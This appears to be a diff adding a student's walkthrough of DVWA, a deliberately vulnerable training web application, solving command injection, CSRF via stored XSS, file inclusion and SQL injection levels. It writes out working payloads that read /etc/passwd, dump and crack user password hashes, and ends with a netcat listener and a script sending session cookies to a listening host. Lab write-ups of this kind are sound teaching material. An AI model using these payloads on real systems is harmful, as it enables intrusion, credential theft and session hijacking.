@@ -1,0 +1,107 @@
+====================================================
+Vulnerability: Command Execution [Low]
+====================================================
+This is a simple remote code execution vulnerability. The form sumbits our input without sanatizing it. By first inserting a semicolon, we can run any command we want. 
+
+Input: ; cat /etc/passwrd
+
+This input will reveal to us the whole /etc/passwrd file
+====================================================
+Vulnernability: Command Execution [Medium]
+====================================================
+This problem is similar to [Low] with the exception that && and ; are now barred. We can however still use ||.
+
+Input: || cat /etc/passwd
+
+This input will reveal to us the whole /etc/passwrd file
+====================================================
+Vulnerability: Cross Site Request Forgery [Low/Medium]
+====================================================
+We first scout out the vulnerability by simply changing our password. When we change the password, we get this url.
+
+http://localhost/dvwa/vulnerabilities/csrf/?password_new=asdf&password_conf=asdf&Change=Change#
+
+If we change 'asdf' to anything else, the password changes also. There is no validation.
+
+We can abuse this in the XSS Stored tab. We can make a comment that always changes the admin password to password when a user looks at that page. You can remove the character limitation locally.
+
+Message: Test Message Please Ignore. <img src=http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#>
+
+This comment can be on any page, so as long as the target user is logged into dvwa.
+====================================================
+Vulernability: File Inclusion [Low/Medium]
+====================================================
+Both low and medium security operate similarily for this problem. 
+We can simply change the query string and set the page to whatever we want.
+
+URL: http://10.0.2.15/dvwa/vulnerabilities/fi/?page=/etc/passwd
+
+By changing include.php to /etc/passwd, the whole /etc/passwd file is revealed to us. The paths to the include statements were not properly sanitized. 
+
+====================================================
+Vulnerability: SQL Injection [Low]
+====================================================
+We can start by testing if the input is vulnerable to SQL injection by adding a tick mark. This gives us an error, meaning that the input is not properly sanatized.
+
+Input: ' OR '1' = '1
+
+We can now input the above statement to reveal the data of everyone in the system.
+
+Input: 1' OR '1' = '1' UNION SELECT table_name, column_name FROM information_schema.columns #
+
+We can UNION other table data (making sure they have 2 columns also). This will display all tables and columns.
+
+Table users is particularly interesting containing the column password. 
+
+Input: 1' OR '1' = '1' UNION SELECT user, password FROM users #
+
+We can get all the users' passwords (hashed version).
+
+Here are the logins:
+User/Pass
+admin/password
+gordonb/abc123
+1337/charley
+pablo/letmein
+smithy/password
+
+We can also list /etc/passwd one again
+
+Input: 1' OR '1' = '1' UNION SELECT null, LOAD_FILE('/etc/passwd') #
+
+====================================================
+Vulernability: SQL Injection [Medium]
+====================================================
+After The input is escaped on this difficulty. ' turn into \'. We can no longer use them. Instead, after trial and error, this input revealed the data of everyone in the system
+
+Input: 1 = 1
+
+The input is escaped, but not completely sanatized. We can UNION other table data (making sure they have 2 columns also). We can then input the below statement in order to list all the tables and columns. 
+
+Input: 1 = 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+
+
+
+There one table that interest us.
+Table: users
+	- Columns: first_name, last_name, user, password
+
+We can now get all the users' passwords.
+
+Input: 1 = 1 UNION SELECT user, password FROM users
+
+Putting the md5 hashed (but unsalted) passwords into a rainbow table, we get the followin logins:
+
+User/Pass
+admin/password
+gordonb/abc123
+1337/charley
+pablo/letmein
+smithy/password
+
+nc -l 10.0.2.15:12345
+
+<script> new Image().src="http://10.0.2.15:12345/cookie.php?"+document.cookie;</script>
+
+
+
